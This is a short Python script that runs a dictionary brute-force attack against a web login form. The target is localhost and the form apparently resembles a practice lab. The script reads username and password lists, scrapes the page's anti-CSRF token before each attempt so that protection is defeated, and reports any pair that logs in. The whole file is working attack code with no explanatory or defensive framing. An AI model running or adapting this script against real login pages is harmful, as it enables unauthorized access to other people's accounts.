from bs4 import BeautifulSoup
import requests
import re

# Target URL
login_url = 'http://localhost/login.php'

# Define generic payload payload
payload = {
    'username': '',
    'password': '',
    'Login': 'Login'
}

# Open a new session to hack
with requests.Session() as session:
    # Crack the login password with dictionary attack
    with open('users.txt', 'r', encoding='utf-8') as users:
        for user in users:
            with open('passwords.txt', 'r', encoding='utf-8') as passwords:
                for password in passwords:
                    # Try payload to send in order to crack login
                    payload['username'] = user.strip()
                    payload['password'] = password.strip()
                    # Get the login url
                    r = session.get(login_url)
    
                    # Extract user token
                    token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
                    payload['user_token'] = token

                    # Try to hack with payload
                    p = session.post(login_url, data=payload)

                    # If hack is done, it will redirect to index
                    if p.url in ['http://localhost/index.php']:
                        # Print the correct user/password
                        print(f'Cracked with {user.strip()}/{password.strip()}')
